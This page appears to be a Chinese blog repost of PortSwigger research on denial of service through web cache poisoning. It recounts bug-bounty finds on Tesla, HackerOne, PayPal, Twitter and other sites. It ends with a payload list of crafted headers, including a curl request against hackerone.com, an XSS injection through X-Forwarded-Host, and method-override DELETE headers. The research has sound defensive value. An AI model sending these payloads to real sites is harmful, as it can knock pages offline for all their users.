@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="在这篇文章中，我将讲述我如何喜欢拒绝服务攻击的故事，并向您展示如何使用Web缓存中毒以单个请求关闭网站，并同时获得漏洞赏金。 拒绝服务（DoS）攻击的声誉很差。从历史上看，DoS曾经是微不足道的-您可以使用脚本小子友好的工具（如slowloris.pl）使大多数站点脱机。DoS攻击通常也与DDoS攻击混为一谈，而DDoS攻击几乎不可能真正修复。在被“黑客入侵”的站点与仅被（D）DoS攻击的站点之">
+<meta name="keywords" content="burp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web缓存中毒导致响应的拒绝服务">
+<meta property="og:url" content="https://wh0ale.github.io/2019/10/26/Web缓存中毒导致响应的拒绝服务/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="在这篇文章中，我将讲述我如何喜欢拒绝服务攻击的故事，并向您展示如何使用Web缓存中毒以单个请求关闭网站，并同时获得漏洞赏金。 拒绝服务（DoS）攻击的声誉很差。从历史上看，DoS曾经是微不足道的-您可以使用脚本小子友好的工具（如slowloris.pl）使大多数站点脱机。DoS攻击通常也与DDoS攻击混为一谈，而DDoS攻击几乎不可能真正修复。在被“黑客入侵”的站点与仅被（D）DoS攻击的站点之">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://portswigger.net/cms/images/1d/a3/78f2eb8c05c6-article-responsible_denial_of_service_with_web_cache_poisoning_article.png">
+<meta property="og:image" content="https://portswigger.net/cms/images/0c/c2/2823560b957f-article-image_(1).png">
+<meta property="og:updated_time" content="2019-10-26T14:14:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web缓存中毒导致响应的拒绝服务">
+<meta name="twitter:description" content="在这篇文章中，我将讲述我如何喜欢拒绝服务攻击的故事，并向您展示如何使用Web缓存中毒以单个请求关闭网站，并同时获得漏洞赏金。 拒绝服务（DoS）攻击的声誉很差。从历史上看，DoS曾经是微不足道的-您可以使用脚本小子友好的工具（如slowloris.pl）使大多数站点脱机。DoS攻击通常也与DDoS攻击混为一谈，而DDoS攻击几乎不可能真正修复。在被“黑客入侵”的站点与仅被（D）DoS攻击的站点之">
+<meta name="twitter:image" content="https://portswigger.net/cms/images/1d/a3/78f2eb8c05c6-article-responsible_denial_of_service_with_web_cache_poisoning_article.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/10/26/Web缓存中毒导致响应的拒绝服务/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Web缓存中毒导致响应的拒绝服务 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/10/26/Web缓存中毒导致响应的拒绝服务/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Web缓存中毒导致响应的拒绝服务
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-26 11:22:10 / 修改时间：22:14:02" itemprop="dateCreated datePublished" datetime="2019-10-26T11:22:10+08:00">2019-10-26</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">4.4k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">4 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p><img src="https://portswigger.net/cms/images/1d/a3/78f2eb8c05c6-article-responsible_denial_of_service_with_web_cache_poisoning_article.png" alt="img"></p>
+<p>在这篇文章中，我将讲述我如何喜欢拒绝服务攻击的故事，并向您展示如何使用Web缓存中毒以单个请求关闭网站，并同时获得漏洞赏金。</p>
+<p>拒绝服务（DoS）攻击的声誉很差。从历史上看，DoS曾经是微不足道的-您可以使用脚本小子友好的工具（如<code>slowloris.pl</code>）使大多数站点脱机。DoS攻击通常也与DDoS攻击混为一谈，而DDoS攻击几乎不可能真正修复。在被“黑客入侵”的站点与仅被（D）DoS攻击的站点之间划了界线。结果，包括我在内的许多黑客都将DoS漏洞视为la脚。当然，“可用性”位于CIA三合会中，因此位于CVSS中，但这只是CVSS失败的另一个原因，对吗？这是我的观点，直到一年来发生的一系列事件改变了它。</p>
+<p>在研究Web缓存中毒时，我注意到您可以将其用于单请求持久性DoS攻击，但是直到我发现由于WAF返回可缓存的“您在请求中看到文本“ burpcollaborator.net”时被屏蔽。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /en_GB/roadster?dontpoisoneveryone=1 HTTP/1.1</span><br><span class="line">Host: www.tesla.com</span><br><span class="line">Any-Header: burpcollaborator.net</span><br><span class="line"></span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">Access Denied. Please contact waf@tesla.com</span><br></pre></td></tr></table></figure>
+
+<p>出于效率原因，缓存键仅包含突出显示的值，因此任何随后尝试访问该URL的人都将获得缓存命中并收到“拒绝访问”响应。<code>dontpoisoneveryone</code>参数对于证明在没有实际造成站点停机的情况下进行攻击是至关重要的。有关此技术的深入说明，请参阅<a href="https://portswigger.net/blog/practical-web-cache-poisoning" target="_blank" rel="noopener">《实用Web缓存中毒》</a>。</p>
+<p>这是对基于标头的标准攻击的一个奇怪变体，将为我的演讲做一个很好的例子，因此我试探性地举报了此事，出乎意料地获得了300美元的奖励。</p>
+<p>后来，在发现，报告并发布了Drupal的关键缓存中毒利用链之后，我意识到<a href="http://www.hackerone.com一直在使用Drupal，但他们已经应用了该补丁。在尝试绕过补丁程序时，我注意到该`X-Forwarded-Port`标头可用于永久性地[破坏](https://hackerone.com/reports/409370)具有无效端口的[重定向](https://hackerone.com/reports/409370)，从而导致每个尝试访问其站点的人都超时：" target="_blank" rel="noopener">www.hackerone.com一直在使用Drupal，但他们已经应用了该补丁。在尝试绕过补丁程序时，我注意到该`X-Forwarded-Port`标头可用于永久性地[破坏](https://hackerone.com/reports/409370)具有无效端口的[重定向](https://hackerone.com/reports/409370)，从而导致每个尝试访问其站点的人都超时：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?dontpoisoneveryone=1 HTTP/1.1</span><br><span class="line">Host: www.hackerone.com</span><br><span class="line">X-Forwarded-Port: 123</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: https://www.hackerone.com:123/</span><br></pre></td></tr></table></figure>
+
+<p>我报告这主要是因为错过了应用Drupal漏洞的机会而烦恼，并获得了2500美元的赏金。</p>
+<p>之后不久，学术研究人员Hoai Viet Nguyen和Luigi Lo Iacono与我联系，他们就如何使用Web缓存中毒进行DoS攻击时询问了我的建议。我提供了一些技术建议，然后礼貌地建议拒绝服务攻击不是值得认真研究的话题，但是他们明智地无视了我，并且继续前进。</p>
+<p>然后，在圣诞节前夕，Deliveroo与我联系，因为有人因为缓存中毒而关闭了他们的网站，并且由于一些困惑，他们认为我有责任。</p>
+<p>最后，在尝试对我无法命名的目标进行HTTP异步攻击时，我碰巧使用了Burp Repeater的“将URL粘贴为请求”功能，该功能从URL创建HTTP请求，并<code>User-Agent</code>从古老的Internet Explorer 9中接收该请求。意外地用“请更新您的浏览器”响应覆盖缓存的页面。我报告了这个消息，并获得了令人eye目的$ 7,500，这实际上比我获得的异步攻击收益还多。</p>
+<p>在这一点上，我偶然发现了DoS漏洞，已经赚了10,000多美元，并且再也不能忽略这个想法，即有些公司确实关心DoS。回想起来，这似乎是<a href="https://portswigger.net/research/so-you-want-to-be-a-web-security-researcher#invent" target="_blank" rel="noopener">我如何成为网络安全研究员的提示摘要</a>付诸实践的坚实例证。我清除了<a href="https://github.com/PortSwigger/param-miner" target="_blank" rel="noopener">Param Miner</a>灰尘，调整了缓存中毒检测功能，以使您在切换“棘手的缓存中毒”选项时更加敏感，并开始赚取一些赏金。以下是一些要点：</p>
+<p>在<a href="https://bitbucket.org上，您可以使用`X-Forwarded-SSL`header覆盖某些页面，并显示&quot;Contradictory" target="_blank" rel="noopener">https://bitbucket.org上，您可以使用`X-Forwarded-SSL`header覆盖某些页面，并显示&quot;Contradictory</a> scheme headers&quot;，同时还<code>Transfer-Encoding</code>可以覆盖任意页面。这获得了$ 1,800的赏金：</p>
+<p><img src="https://portswigger.net/cms/images/0c/c2/2823560b957f-article-image_(1).png" alt="img"></p>
+<p>在<a href="https://paypal.com/上，您可以通过使用无效的`Transfer-Encoding`标头将来自www.paypalobjects.com的重要JavaScript文件替换为消息&quot;501未实现&quot;" target="_blank" rel="noopener">https://paypal.com/上，您可以通过使用无效的`Transfer-Encoding`标头将来自www.paypalobjects.com的重要JavaScript文件替换为消息&quot;501未实现&quot;</a> 来破坏核心功能。他们对此进行了修补，并<a href="https://hackerone.com/reports/622122" target="_blank" rel="noopener">获得了9,700美元的顶级赏金</a>。</p>
+<p>我的同事Gareth Heyes发现，通过<code>Accept_Encoding: br</code>强制使用brotli编码的响应，您可以为使用旧浏览器或代理的用户使用DOS Dos instagram 。<code>Accept-Encoding</code>在缓存键中，但是使用下划线会使缓存错过它。这赚了500美元，捐赠后翻了一番，达到1,000美元。</p>
+<p>最后，您可以使用标头<code>Range: bytes=cow</code>引起400响应，从而拒绝访问从abs.twimg.com和ton.twimg.com加载的核心Twitter JavaScript文件。他们决定不为此打补丁或付款，因此您可以（认真地）将其用于练习。</p>
+<p>其他成功的攻击中使用的<code>Accept</code>，<code>Upgrade</code>，<code>Origin</code>，和<code>Max-Forwards</code>头。</p>
+<p>大多数漏洞悬赏政策的文字都禁止DoS攻击。但是，如果仔细观察，您会发现其中一些实际上禁止发动DoS攻击，而不是禁止报告DoS漏洞。Web缓存中毒具有一个罕见的属性，因为只要使用缓存破坏器，通常就可以在不实际发起攻击的情况下进行概念验证。</p>
+<p>就是说，相当多的程序在报告DoS漏洞方面确实有全面的排除。我建议足够成熟的程序考虑其业务需求，并可能调整其措辞以仅排除&quot;体积DoS&quot;或&quot;计算DoS&quot;报告。</p>
+<p>最后，前面提到的学术研究实际上已在本周早些时候发表-您可以在<a href="https://cpdos.org/" target="_blank" rel="noopener">https://cpdos.org/上</a>阅读。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Port: 123</span><br><span class="line">X-Forwarded-Port标头可用于永久性地破坏具有无效端口的重定向，从而导致每个尝试访问其站点的人都超时</span><br><span class="line"></span><br><span class="line">curl -H &apos;X-Forwarded-Host: www.hackerone.com:123&apos; https://www.hackerone.com/index.php?dontpoisoneveryone=1</span><br><span class="line">使用X-Forwarded-Host标头完成此攻击</span><br><span class="line"></span><br><span class="line">X-Forwarded-SSL: on</span><br><span class="line">Transfer-Encoding: asdf</span><br><span class="line">使用X-Forwarded-SSL header覆盖某些页面，并显示“ Contradictory scheme headers”，同时还Transfer-Encoding可以覆盖任意页面。</span><br><span class="line"></span><br><span class="line">Accept_Encoding: br</span><br><span class="line">Accept_Encoding: br强制使用brotli编码的响应，您可以为使用旧浏览器或代理的用户使用DOS Dos instagram。</span><br><span class="line"></span><br><span class="line">Range: bytes=cow</span><br><span class="line">使用标头Range: bytes=cow引起400响应，从而拒绝访问从abs.twimg.com和ton.twimg.com加载的核心Twitter JavaScript文件。</span><br><span class="line"></span><br><span class="line">X-Forwarded-Host</span><br><span class="line">X-Forwarded-Host: canary</span><br><span class="line">Cache-Control: public, no-cache</span><br><span class="line">RESPONSE: &lt;meta property=&quot;og:image&quot; content=&quot;https://canary/cms/social.png&quot; /&gt;</span><br><span class="line"></span><br><span class="line">X-Forwarded-Host: a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;meta property=&quot;og:image&quot; content=&quot;https://a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt; </span><br><span class="line"></span><br><span class="line">其他成功的攻击中使用的Accept，Upgrade，Origin，和Max-Forwards头。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CPDoS: Cache Poisoned Denial of Service</span><br><span class="line">HTTP标头超大（HHO）</span><br><span class="line">X-Oversized-Header-1: Big-Value-0000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">HTTP元字符（HMC）</span><br><span class="line">HTTP元字符（HMC）CPDoS攻击的工作方式类似于HHO CPDoS攻击。此攻击不是发送过大的标头，而是尝试通过包含有害元字符的请求标头绕过缓存。元字符可以是例如控制字符，例如换行符/回车符（\n），换行符（\r）或铃声（\a）。</span><br><span class="line">X-Metachar-Header: \n</span><br><span class="line"></span><br><span class="line">HTTP方法覆盖攻击（HMO）</span><br><span class="line">该HTTP标准为Web服务器和客户端几个HTTP方法在网络上进行交易。GET，POST，DELETE并且PUT可以说是在Web应用程序和基于REST的Web服务中最常用的HTTP方法。</span><br><span class="line">X-HTTP-Method-Override，X-HTTP-Method或X-Method-Override用于隧道阻止的HTTP方法。请求到达服务器后，标头指示Web应用程序用相应标头值中的一个覆盖请求行中的HTTP方法。</span><br><span class="line">X-HTTP-Method-Override: DELETE</span><br><span class="line">X-HTTP-Method: DELETE</span><br><span class="line">X-Method-Override: DELETE</span><br><span class="line">RESPONSE: Resource has been successfully removed with the DELETE method.</span><br></pre></td></tr></table></figure>
+
+<p>转载：</p>
+<p><a href="https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning</a></p>
+<p><a href="https://cpdos.org/" target="_blank" rel="noopener">https://cpdos.org/</a></p>
+<p><a href="https://portswigger.net/research/practical-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/research/practical-web-cache-poisoning</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/10/26/Web缓存中毒导致响应的拒绝服务/" title="Web缓存中毒导致响应的拒绝服务">https://wh0ale.github.io/2019/10/26/Web缓存中毒导致响应的拒绝服务/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/burp/" rel="tag"><i class="fa fa-tag"></i># burp</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/10/21/证书伪造/" rel="next" title="证书伪造">
+                <i class="fa fa-chevron-left"></i> 证书伪造
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/10/27/Window-Denfender-Bypass/" rel="prev" title="Window Denfender Bypass">
+                Window Denfender Bypass <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
